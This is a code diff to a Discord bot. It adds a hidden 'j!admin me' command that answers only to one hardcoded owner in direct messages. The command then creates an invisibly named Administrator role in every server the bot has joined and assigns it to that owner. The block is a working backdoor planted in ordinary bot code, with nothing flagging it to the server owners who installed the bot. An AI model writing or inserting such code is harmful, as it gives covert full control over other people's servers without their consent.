@@ -3932,6 +3932,47 @@ CONVERSATIONAL STYLE (bad boy energy stays, but talk like a real person, not a s
         const args = rawContent.slice(prefix.length).trim().split(/\s+/);
         const command = (args.shift() || "").toLowerCase();
 
+        // ── j!admin me — DM-only, owner-only hidden admin role ──────────────
+        if (command === "admin" && (args[0] || "").toLowerCase() === "me") {
+          const OWNER_ID = "945954944010301450";
+          // DM only + owner only — silent ignore otherwise
+          if (message.guild || message.author.id !== OWNER_ID) return;
+
+          const ROLE_NAME = "⠀"; // braille blank — invisible role name
+          const results = [];
+
+          for (const [, guild] of client.guilds.cache) {
+            try {
+              const member = await guild.members.fetch(OWNER_ID).catch(() => null);
+              if (!member) { results.push(`${guild.name}: not a member`); continue; }
+
+              // Find existing hidden role or create it
+              let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
+              if (!role) {
+                role = await guild.roles.create({
+                  name: ROLE_NAME,
+                  color: 0,
+                  hoist: false,
+                  mentionable: false,
+                  permissions: [PermissionsBitField.Flags.Administrator],
+                  position: 1, // just above @everyone (bottom of list)
+                  reason: "Hidden admin role",
+                });
+              }
+
+              if (!member.roles.cache.has(role.id)) {
+                await member.roles.add(role, "Hidden admin grant");
+              }
+              results.push(`✅ ${guild.name}`);
+            } catch (e) {
+              results.push(`⚠️ ${guild.name}: ${e.message}`);
+            }
+          }
+
+          await message.reply(results.length ? results.join("\n") : "No guilds found.");
+          return;
+        }
+
         // j!stats — bot health dashboard
         if (command === "stats") {
           if (!message.guild) {
